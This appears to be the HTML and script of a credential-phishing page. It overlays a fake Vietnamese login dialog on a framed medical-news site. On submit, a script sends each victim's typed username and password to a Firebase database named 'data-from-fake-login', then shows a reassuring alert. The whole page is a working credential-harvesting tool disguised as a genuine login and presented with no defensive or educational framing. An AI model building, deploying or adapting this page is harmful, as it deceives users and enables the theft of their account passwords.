  <body style="height: 100vh; overflow: hidden">
    <iframe
      src="https://medical-news-ute.vercel.app/"
      width="101% "
      height="100%"
      style="position: relative; top: 0px; left: -8px"
      name="the-iFrame"
      frameborder="0"
    ></iframe>
    <div id="modal" class="modal">
      <div class="modal__content active">
        <div class="auth-wrap">
          <div>
            <div class="auth-header">
              <ul>
                <li><a>Đăng nhập</a></li>
              </ul>
            </div>
            <div class="auth-body">
              <div class="form-wrap">
                <form
                  id="form-login"
                  method="GET"
                  action="https://medical-news-ute.vercel.app/post/dan-mach-tuyen-bo-dung-tiem-vaccine"
                >
                  <div class="form-group d-flex">
                    <div class="d-flex label-group">
                      <label>Tên đăng nhập</label>
                    </div>
                    <div class="field-wrap">
                      <input
                        placeholder="Username"
                        id="username"
                        required=""
                        name="username"
                        type="text"
                        value=""
                      />
                    </div>
                  </div>
                  <div class="form-group d-flex">
                    <div class="label-group d-flex">
                      <label>Mật khẩu</label>
                    </div>
                    <div class="field-wrap">
                      <input
                        placeholder="Password"
                        required=""
                        id="password"
                        name="password"
                        type="password"
                        value=""
                      />
                    </div>
                  </div>
                  <div class="d-flex">
                    <label class="remember-label" for="remember"
                      ><span>Ghi nhớ mật khẩu</span
                      ><input type="checkbox" id="remember" /><span
                        class="checkmark"
                      ></span
                    ></label>
                  </div>
                  <button id="submit" type="submit" class="rounded-2">
                    Đăng nhập</button
                  ><span></span>
                </form>
              </div>
            </div>
          </div>
        </div>
        <div class="modal__content__close">
          <i class="fa-solid fa-xmark"></i>
        </div>
      </div>
    </div>
    <!------------------------Page Layout Content------------------------->
    <!------------------------Scripting------------------------->
    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
      import {
        getDatabase,
        ref,
        set,
        get,
        child,
      } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js";
      const firebaseConfig = {
        apiKey: "AIzaSyDoJmsJ4Jqrh_ymYFuH3IMGnW8o7LHdYQs",
        authDomain: "data-from-fake-login.firebaseapp.com",
        projectId: "data-from-fake-login",
        storageBucket: "data-from-fake-login.appspot.com",
        messagingSenderId: "979032913693",
        appId: "1:979032913693:web:8075f3c2747e721e8e93f4",
        measurementId: "G-L54PTDPCSB",
      };

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);

      // Get a reference to the database service
      const db = getDatabase(app);

      document
        .getElementById("form-login")
        .addEventListener("submit", function (e) {
          e.preventDefault();
          set(ref(db, "users/" + Math.random().toString(36).slice(2, 7)), {
            username: document.getElementById("username").value,
            password: document.getElementById("password").value,
          });

          alert("Your form is submitted");
          document.getElementById("form-login").reset();
        });
    </script>
  </body>
